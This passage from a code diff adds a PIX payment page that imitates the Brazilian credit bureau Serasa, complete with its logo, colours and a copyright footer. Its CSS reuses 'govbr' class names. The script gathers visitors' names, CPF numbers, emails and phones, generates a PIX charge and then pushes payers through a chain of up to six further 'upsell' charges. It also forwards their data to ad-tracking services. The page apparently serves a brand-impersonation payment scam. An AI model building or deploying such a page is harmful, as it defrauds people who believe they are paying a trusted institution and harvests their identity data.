@@ -1,0 +1,976 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="../js/tracking-2.js"></script>
+  <script src="../assets/js/meta-pixel-4.js"></script>
+  <meta charset="UTF-8">
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="../3.4.17"></script>
+    <link href="../css/rawline" rel="stylesheet">
+    <!-- Font Awesome diretamente do CDN oficial -->
+    <link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
+ 
+    <script>
+        window.pixelId = "67c08c84d7fc4bc7a586df38";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#d72a7f', // Cor primária Serasa (rosa)
+                        'secondary': '#EFEFEF', // Cinza claro
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF', // Cor clara para fundos
+                        'warning': '#FF0000', // Vermelho para alertas
+                        'yellow': '#d72a7f' // Rosa Serasa
+                    },
+                    fontFamily: {
+                        'sans': ['Montserrat', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('../css2-5');
+        
+        * {
+            font-family: 'Montserrat', sans-serif !important;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f5f7fa;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+        
+        .govbr-container {
+            max-width: 720px;
+            margin: 0 auto;
+        }
+        
+        /* Header estilo Serasa */
+        header {
+            background: linear-gradient(135deg, #d72a7f 0%, #d72a7f 100%);
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.2);
+            padding: 12px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        header img {
+            width: 110px;
+            margin: 0;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+        
+        .nav-bar {
+            background-color: white;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e5e7eb;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            min-height: 60px;
+        }
+        
+        .nav-bar-content {
+            display: flex;
+            align-items: center;
+            color: #374151;
+            font-size: 14px;
+            flex: 1;
+            min-width: 0;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-bar {
+                padding: 8px 12px;
+                min-height: 50px;
+            }
+            
+            .nav-bar-content {
+                font-size: 12px;
+            }
+        }
+        
+        /* Botões estilo Serasa */
+        .govbr-button {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .govbr-button:hover {
+            background: linear-gradient(135deg, #b8235a 0%, #d63384 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(215, 42, 127, 0.4);
+        }
+        
+        .govbr-button:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% {transform: translateX(-100%) rotate(30deg);}
+            100% {transform: translateX(100%) rotate(30deg);}
+        }
+        
+        .govbr-outline-button {
+            border: 2px solid #d72a7f;
+            color: #d72a7f;
+            transition: all 0.3s ease;
+            border-radius: 12px;
+        }
+        
+        .govbr-outline-button:hover {
+            background-color: #d72a7f;
+            color: white;
+        }
+        
+        .govbr-card {
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(215, 42, 127, 0.1);
+        }
+        
+        .govbr-input {
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #f9fafb;
+            transition: all 0.3s ease;
+        }
+        
+        .govbr-input:focus {
+            border-color: #d72a7f;
+            box-shadow: 0 0 0 3px rgba(215, 42, 127, 0.1);
+            outline: none;
+        }
+        
+        .govbr-input:disabled {
+            background-color: #f3f4f6;
+            color: #6b7280;
+        }
+        
+        .govbr-badge {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 2px 8px rgba(215, 42, 127, 0.2);
+        }
+        
+        .govbr-timer {
+            color: #dc2626;
+            font-weight: bold;
+        }
+        
+        .govbr-loading {
+            border-top-color: #d72a7f;
+        }
+        
+        .govbr-success-icon {
+            color: #d72a7f;
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(215, 42, 127, 0.7);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(215, 42, 127, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(215, 42, 127, 0);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .valor-aprovado-container {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-left: 4px solid #d72a7f;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.1);
+        }
+        
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .valor-aprovado {
+            color: #d72a7f;
+            font-size: 32px;
+            font-weight: 700;
+            display: block;
+        }
+
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            color: white;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(215, 42, 127, 0.3);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 500;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+        
+        /* Cards estilo Serasa */
+        .bg-white {
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        /* Cores Serasa */
+        .bg-yellow-500 {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%) !important;
+            color: white !important;
+        }
+        
+        .bg-blue-600, .bg-blue-50 {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%) !important;
+        }
+        
+        .bg-blue-50 {
+            background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%) !important;
+        }
+        
+        .border-blue-400 {
+            border-color: #d72a7f !important;
+        }
+        
+        .text-blue-400, .text-blue-700 {
+            color: #d72a7f !important;
+        }
+        
+        .rounded-md, .rounded-lg {
+            border-radius: 12px;
+        }
+        
+        .bg-green-600 {
+            background-color: #168821 !important;
+        }
+        
+        .text-green-600 {
+            color: #168821 !important;
+        }
+        
+        /* Footer estilo Serasa */
+        .govbr-footer {
+            background: linear-gradient(135deg, #004691 0%, #d72a7f 100%);
+            color: #fff;
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        
+        .govbr-footer img {
+            width: 120px;
+            margin-bottom: 15px;
+            filter: brightness(0) invert(1);
+        }
+        
+        .govbr-footer p {
+            margin: 8px 0;
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            margin-top: 20px;
+            min-height: calc(100vh - 200px);
+            position: relative;
+        }
+        
+        /* Efeitos hover para cards */
+        .govbr-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(215, 42, 127, 0.15);
+            transition: all 0.3s ease;
+        }
+        
+        /* Estilo para botões do header */
+        header button {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        header button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewbox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <!-- Header da Serasa -->
+    <header>
+        <div class="flex items-center gap-2">
+            <img src="../serasa-logo-2-1.png" alt="Serasa" width="120" height="40" class="w-auto h-10">
+        </div>
+        <div class="flex items-center">
+            <button class="px-3 py-1 bg-primary text-white rounded-full text-sm font-semibold flex items-center">
+                <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                </svg>
+                <span id="user-first-name"></span>
+            </button>
+        </div>
+    </header>
+
+    <nav class="nav-bar">
+        <div class="nav-bar-content flex-wrap">
+            <svg class="w-4 h-4 mr-2 text-primary flex-shrink-0" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+            </svg>
+            <div class="flex items-center flex-wrap gap-1 text-sm md:text-base">
+                <span class="font-medium">Serasa</span>
+                <span class="text-gray-400 mx-1">›</span>
+                <span class="font-medium">Proteção Premium</span>
+                <span class="text-gray-400 mx-1">›</span>
+                <span class="font-medium text-primary">Pagamento</span>
+            </div>
+        </div>
+        <svg class="w-4 h-4 text-primary flex-shrink-0 hidden md:block" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+    </nav>
+
+    <div id="loadingPage" class="fixed inset-0 flex items-center justify-center z-50 hidden" style="background-color: #d72a7f;">
+         <div class="text-center">
+             <div class="relative mb-8">
+                 <div class="relative">
+                     <div class="animate-spin rounded-full h-24 w-24 border-8 border-white border-t-transparent mx-auto"></div>
+                     <div class="absolute inset-0 flex items-center justify-center">
+                         <img src="../serasa-logo-2-1.png" alt="Serasa" class="w-12 h-auto filter brightness-0 invert">
+                     </div>
+                 </div>
+             </div>
+             <div class="space-y-3">
+                 <p class="text-white text-2xl font-bold tracking-wide">Processando Pagamento</p>
+                 <p class="text-white/90 text-base font-medium">Aguarde enquanto validamos suas informações</p>
+                 <div class="flex justify-center mt-4">
+                     <div class="flex space-x-1">
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0ms;"></div>
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 150ms;"></div>
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 300ms;"></div>
+                     </div>
+                 </div>
+             </div>
+         </div>
+     </div>
+
+    <div id="mainPage" class="main-content fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6">
+                <h1 class="text-2xl font-bold text-dark mb-6">Pagamento Serasa via PIX</h1>
+                
+                <div class="valor-aprovado-container">
+                    <span class="valor-aprovado-label">Valor a pagar:</span>
+                    <span class="valor-aprovado" id="valorPagamento">Carregando...</span>
+                </div>
+
+                <div class="mt-6">
+                    <p class="text-sm text-gray-600 mb-4">
+                        Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento.
+                    </p>
+
+                    <div class="flex flex-col items-center space-y-4">
+                        <div id="qrCodeContainer" class="bg-white p-4 rounded-lg shadow-sm">
+                            <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-48 h-48">
+                        </div>
+
+                        <div class="w-full">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">
+                                Código PIX (Copiar e Colar)
+                            </label>
+                            <div class="space-y-3">
+                                <input type="text" id="pixCode" class="govbr-input w-full" readonly="">
+                                <button onclick="copyPixCode()" class="govbr-button w-full">
+                                 
+                                    Copiar Código PIX
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <div class="flex">
+                                <div class="flex-shrink-0">
+                                    <svg class="h-5 w-5 text-blue-400" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 20 20" fill="currentColor">
+                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
+                                    </svg>
+                                </div>
+                                <div class="ml-3">
+                                    <p class="text-sm text-blue-700">
+                                        Após o pagamento, aguarde alguns instantes para a confirmação automática.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer da Serasa -->
+    <footer class="govbr-footer mt-10">
+        <img src="../serasa-logo-2-1.png" alt="Serasa">
+        <div>
+            <p>© 2024 Serasa S.A. Todos os direitos reservados.</p>
+            <p>Serasa é uma marca registrada da Experian Information Solutions, Inc.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Obter primeiro nome da URL
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const nomeCompleto = urlParams.get('nome');
+            
+            if (nomeCompleto) {
+                // Split para pegar apenas a primeira palavra (primeiro nome)
+                const primeiroNome = nomeCompleto.split(' ')[0];
+                
+                // Atualiza o texto no botão
+                document.getElementById('user-first-name').textContent = primeiroNome;
+            }
+        });
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+            
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        function formatarValor(valor) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(valor / 100);
+        }
+
+        async function iniciarPagamento() {
+            document.getElementById('loadingPage').classList.remove('hidden');
+            document.getElementById('mainPage').classList.add('hidden');
+
+            // Pegar todos os parâmetros da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Pegar o valor do parâmetro 'valor' e converter para centavos
+            const valorRaw = String(urlParams.get('valor') || '2790').trim();
+            let valorPagamento = 2790;
+            const matchDecimal = valorRaw.match(/(\d+)[,.](\d{2})(?!\d)/);
+            if (matchDecimal) {
+                valorPagamento = parseInt(matchDecimal[1], 10) * 100 + parseInt(matchDecimal[2], 10);
+            } else {
+                const digits = valorRaw.replace(/\D/g, '');
+                if (digits) valorPagamento = parseInt(digits, 10);
+            }
+
+            // Preparar payload para o backend
+            const payload = {
+                valor: valorPagamento,
+                nome: urlParams.get('nome') || '',
+                cpf: urlParams.get('cpf') || '',
+                email: urlParams.get('email') || '',
+                telefone: urlParams.get('telefone') || ''
+            };
+
+            // Tentar obter dados do usuário do localStorage se não vierem pela URL
+            if (!payload.nome || !payload.cpf) {
+                try {
+                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+                    if (dadosUsuario) {
+                        console.log('[Pagamento] Dados do usuário encontrados no localStorage:', dadosUsuario);
+                        
+                        if (!payload.nome && dadosUsuario.nome) {
+                            payload.nome = dadosUsuario.nome;
+                            console.log('[Pagamento] Nome obtido do localStorage:', payload.nome);
+                        }
+                        
+                        if (!payload.cpf && dadosUsuario.cpf) {
+                            payload.cpf = dadosUsuario.cpf;
+                            console.log('[Pagamento] CPF obtido do localStorage:', payload.cpf);
+                        }
+                        
+                        if (!payload.email && dadosUsuario.email) {
+                            payload.email = dadosUsuario.email;
+                        }
+
+                        // Telefone: sem ele o Meta perde a match key "ph" no upsell.
+                        if (!payload.telefone && (dadosUsuario.telefone || dadosUsuario.phone)) {
+                            payload.telefone = dadosUsuario.telefone || dadosUsuario.phone;
+                            console.log('[Pagamento] Telefone obtido do localStorage:', payload.telefone);
+                        }
+                    }
+                } catch (error) {
+                    console.error('[Pagamento] Erro ao obter dados do localStorage:', error);
+                }
+            }
+
+            // Remover prefixo +55 do telefone se existir
+            if (payload.telefone) {
+                payload.telefone = payload.telefone.replace(/^\+55/, '').replace(/\D/g, '');
+                console.log('[Pagamento] Telefone formatado:', payload.telefone);
+            }
+
+            // Adicionar parâmetros UTM
+            const utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck', 'src', 'utm_id', 'fbclid', 'gclid', 'ttclid'];
+            utmFields.forEach(field => {
+                const value = urlParams.get(field);
+                if (value) payload[field] = value;
+            });
+
+            // Identificadores Meta p/ CAPI server-side
+            try {
+                const _gc = n => { const m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : ''; };
+                if (_gc('_fbp')) payload.fbp = _gc('_fbp');
+                if (_gc('_fbc')) payload.fbc = _gc('_fbc');
+                payload.event_source_url = window.location.href;
+            } catch (e) {}
+
+            // Fallback robusto de UTMs via tracking.js (localStorage). Cobre o caso do
+            // pixel da UTMify falhar no load (erro 400) ou de refresh sem UTM na URL.
+            // Nao sobrescreve o que ja veio pela URL.
+            try {
+                if (typeof window.gvdesenrolaMergeTracking === 'function') {
+                    const trk = window.gvdesenrolaMergeTracking();
+                    Object.keys(trk).forEach(k => {
+                        if (trk[k] && !payload[k]) payload[k] = trk[k];
+                    });
+                }
+            } catch (e) {}
+
+            // Recuperar parâmetros do Utmify se disponível
+            if (window.utmify) {
+                const utmifyParams = window.utmify.getParameters();
+                Object.assign(payload, utmifyParams);
+            }
+
+            console.log('[Pagamento] Enviando dados para backend:', payload);
+
+            try {
+                const response = await fetch('../checkout/pagamento.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro na requisição: HTTP ' + response.status);
+                }
+
+                const data = await response.json();
+                console.log('[Pagamento] Resposta do backend:', data);
+
+                if (data.success) {
+                    document.getElementById('valorPagamento').textContent = formatarValor(data.valor);
+                    document.getElementById('pixCode').value = data.pixCopiaECola || data.pixCode;
+                    document.getElementById('qrCodeImage').src = data.qrCodeUrl || 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                    
+                    document.getElementById('loadingPage').classList.add('hidden');
+                    document.getElementById('mainPage').classList.remove('hidden');
+
+                    // Meta Pixel: InitiateCheckout — PIX gerado. event_id casa com CAPI.
+                    try {
+                        if (window.metaTrack && data.token) {
+                            var _icv = parseInt(new URLSearchParams(window.location.search).get('valor') || '0', 10) || 0;
+                            var _icn = new URLSearchParams(window.location.search).get('from_upsell') || '1';
+                            window.metaTrack('InitiateCheckout', {
+                                value: _icv > 1000 ? (_icv / 100) : _icv,
+                                currency: 'BRL',
+                                content_type: 'product',
+                                content_ids: ['upsell' + _icn],
+                                content_name: 'Upsell ' + _icn,
+                                num_items: 1
+                            }, 'ic_' + data.token);
+                        }
+                    } catch (e) { console.error('[Meta Pixel] erro InitiateCheckout:', e); }
+
+                    // Iniciar verificação de status
+                    verificarStatus(data.token);
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar pagamento');
+                }
+            } catch (error) {
+                console.error('[Pagamento] Erro:', error);
+                alert('Erro ao processar pagamento: ' + error.message + '\nPor favor, tente novamente.');
+                document.getElementById('loadingPage').classList.add('hidden');
+                document.getElementById('mainPage').classList.remove('hidden');
+            }
+        }
+
+        async function enviarParaUtmify(token, statusData) {
+            try {
+                console.log('📤 Enviando dados para Utmify...');
+                
+                // Pegar parâmetros da URL atual
+                const urlParams = new URLSearchParams(window.location.search);
+                const valorPagamento = urlParams.get('valor') || '2790';
+                
+                // Obter dados do usuário do localStorage
+                let dadosUsuario = {};
+                try {
+                    dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                } catch (error) {
+                    console.error('Erro ao obter dados do localStorage:', error);
+                }
+                
+                // Formatar dados no formato exato que utmify.php espera (formato PayHubr)
+                const utmifyData = {
+                    orderId: token,
+                    status: "paid", // Status padronizado para Utmify
+                    amount: parseInt(valorPagamento), // Valor em centavos
+                    createdAt: new Date().toISOString(),
+                    paidAt: new Date().toISOString(), // Campo obrigatório para approvedDate
+                    customer: {
+                        name: dadosUsuario.nome || urlParams.get('nome') || "Cliente",
+                        email: dadosUsuario.email || urlParams.get('email') || "cliente@email.com",
+                        document: {
+                            number: dadosUsuario.cpf || urlParams.get('cpf') || "12345678909"
+                        }
+                    },
+                    items: [
+                        {
+                            id: "produto-" + token,
+                            title: "Produto Digital",
+                            quantity: 1,
+                            unitPrice: parseInt(valorPagamento)
+                        }
+                    ],
+                    fee: {
+                        fixedAmount: 0,
+                        netAmount: parseInt(valorPagamento)
+                    },
+                    trackingParameters: {
+                        utm_source: urlParams.get('utm_source') || null,
+                        utm_medium: urlParams.get('utm_medium') || null,
+                        utm_campaign: urlParams.get('utm_campaign') || null,
+                        utm_term: urlParams.get('utm_term') || null,
+                        utm_content: urlParams.get('utm_content') || null,
+                        src: urlParams.get('src') || null,
+                        sck: urlParams.get('sck') || null,
+                        xcod: urlParams.get('xcod') || null,
+                        fbclid: urlParams.get('fbclid') || null,
+                        gclid: urlParams.get('gclid') || null,
+                        ttclid: urlParams.get('ttclid') || null
+                    }
+                };
+                
+                console.log('📦 Dados formatados para Utmify:', utmifyData);
+                
+                // Enviar para utmify.php
+                const response = await fetch('../checkout/utmify.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(utmifyData)
+                });
+                
+                const result = await response.text();
+                console.log('✅ Resposta do Utmify:', result);
+                
+            } catch (error) {
+                console.error('❌ Erro ao enviar dados para Utmify:', error);
+            }
+        }
+
+        async function verificarStatus(token) {
+            try {
+                console.log('🔍 Verificando status do pagamento:', token);
+                const response = await fetch(`../checkout/verificar.php?id=${encodeURIComponent(token)}`);
+                const httpStatus = response.status;
+                console.log('📊 Status HTTP da resposta:', httpStatus);
+
+                if (!response.ok) {
+                    console.error('❌ Erro HTTP ao verificar status:', httpStatus);
+                    setTimeout(() => verificarStatus(token), 2000);
+                    return;
+                }
+
+                const data = await response.json();
+                console.log('📦 Resposta completa do verificar.php:', data);
+
+                if (data.success && data.status) {
+                    const status = String(data.status).toLowerCase();
+                    
+                    if (status === 'paid' || status === 'approved' || status === 'completed' || status === 'complete') {
+                        console.log('✅ Pagamento aprovado! Status:', status);
+
+                        // Meta Pixel: Purchase — pago confirmado. event_id casa 1:1 com o CAPI.
+                        try {
+                            if (!window.__metaPurchaseFired && window.metaTrack && token) {
+                                window.__metaPurchaseFired = true;
+                                var _upv = parseInt(new URLSearchParams(window.location.search).get('valor') || '0', 10) || 0;
+                                var _un = new URLSearchParams(window.location.search).get('from_upsell') || '1';
+                                window.metaTrack('Purchase', {
+                                    value: _upv > 1000 ? (_upv / 100) : _upv,
+                                    currency: 'BRL',
+                                    content_type: 'product',
+                                    content_ids: ['upsell' + _un],
+                                    content_name: 'Upsell ' + _un,
+                                    num_items: 1
+                                }, 'purchase_' + token);
+                            }
+                        } catch (e) { console.error('[Meta Pixel] erro Purchase:', e); }
+
+                        // Meta CAPI (server-side) — beacon com IP/UA/cookies reais do comprador.
+                        try {
+                            const _gc = n => { const m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : ''; };
+                            fetch('../checkout/meta-capi.php', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                keepalive: true,
+                                body: JSON.stringify({
+                                    transactionId: token,
+                                    fbp: _gc('_fbp'),
+                                    fbc: _gc('_fbc'),
+                                    fbclid: new URLSearchParams(window.location.search).get('fbclid') || '',
+                                    event_source_url: window.location.href
+                                })
+                            }).catch(() => {});
+                        } catch (e) {}
+
+                        // Enviar dados para Utmify
+                        await enviarParaUtmify(token, data);
+                        
+                        // Pegar o referer ou parâmetro da URL para determinar o próximo upsell
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const currentUpsell = urlParams.get('from_upsell') || '1';
+                        console.log('🔄 Upsell atual:', currentUpsell);
+                        
+                        // Determinar próximo upsell e valor
+                        let nextUpsell;
+                        let nextValue;
+                        switch(currentUpsell) {
+                            case '1':
+                                nextUpsell = 'upsell2';
+                                nextValue = '1970';
+                                break;
+                            case '2':
+                                nextUpsell = 'upsell3';
+                                nextValue = '1790';
+                                break;
+                            case '3':
+                                nextUpsell = 'upsell4';
+                                nextValue = '2490';
+                                break;
+                            case '4':
+                                nextUpsell = 'upsell5';
+                                nextValue = '3980';
+                                break;
+                            case '5':
+                                nextUpsell = 'upsell6';
+                                nextValue = '2490';
+                                break;
+                            case '6':
+                                // Fim do funil: nao ha upsell7. Encerra sem redirecionar.
+                                nextUpsell = null;
+                                nextValue = null;
+                                break;
+                            default:
+                                // from_upsell desconhecido: encerra em vez de reiniciar o funil.
+                                nextUpsell = null;
+                                nextValue = null;
+                        }
+
+                        if (!nextUpsell) {
+                            console.log('✅ Fim do funil de upsell. Nao ha proxima oferta.');
+                            try {
+                                var _fim = document.getElementById('mainPage');
+                                if (_fim) {
+                                    _fim.innerHTML = '<div style="max-width:520px;margin:60px auto;padding:32px;text-align:center;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif">'
+                                        + '<div style="font-size:56px;line-height:1">✅</div>'
+                                        + '<h1 style="font-size:22px;margin:16px 0 8px;color:#1351b4">Pagamento confirmado!</h1>'
+                                        + '<p style="font-size:15px;color:#555;margin:0">Sua compra foi concluida com sucesso. Voce recebera as instrucoes no seu contato cadastrado.</p>'
+                                        + '</div>';
+                                }
+                            } catch (e) {}
+                            return;
+                        }
+
+                        console.log('➡️ Próximo upsell:', nextUpsell, 'com valor:', nextValue);
+
+                        // Criar objeto com os dados da transação
+                        const transactionData = {
+                            orderId: token,
+                            status: "APPROVED",
+                            amount: parseInt(urlParams.get('valor') || '2790'),
+                            createdAt: data.data?.created_at || new Date().toISOString(),
+                            approvedDate: data.data?.updated_at || new Date().toISOString(),
+                            customer: data.data?.customer || {
+                                name: data.data?.name || "Cliente",
+                                email: data.data?.email || "cliente@email.com",
+                                document: data.data?.cpf || "12345678909"
+                            },
+                            fee: {
+                                fixedAmount: 0
+                            }
+                        };
+
+                        // Codificar os dados da transação em base64
+                        const transactionBase64 = btoa(JSON.stringify(transactionData));
+                        console.log('📝 Dados da transação:', transactionData);
+
+                        // Pegar parâmetros UTM da URL atual
+                        const utmParams = {};
+                        for (const [key, value] of urlParams.entries()) {
+                            if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                                utmParams[key] = value;
+                            }
+                        }
+
+                        // Construir nova query string com parâmetros atualizados
+                        const newParams = new URLSearchParams({
+                            ...utmParams,
+                            from_upsell: String(parseInt(currentUpsell) + 1),
+                            valor: nextValue,
+                            transaction: transactionBase64
+                        });
+
+                        // Construir URL final
+                        const nextUrl = `/${nextUpsell}/index.html?${newParams.toString()}`;
+                        console.log('🔗 URL de redirecionamento:', nextUrl);
+
+                        // Redirecionar
+                        console.log('🚀 Redirecionando...');
+                        window.location.href = nextUrl;
+                    } else if (status === 'pending' || status === 'waiting_payment') {
+                        console.log('⏳ Pagamento ainda pendente. Verificando novamente em 5 segundos...');
+                        setTimeout(() => verificarStatus(token), 2000);
+                    } else {
+                        console.log('❓ Status desconhecido:', status);
+                        setTimeout(() => verificarStatus(token), 2000);
+                    }
+                } else {
+                    console.log('⚠️ Resposta sem status válido:', data);
+                    setTimeout(() => verificarStatus(token), 2000);
+                }
+            } catch (error) {
+                console.error('❌ Erro ao verificar status:', error);
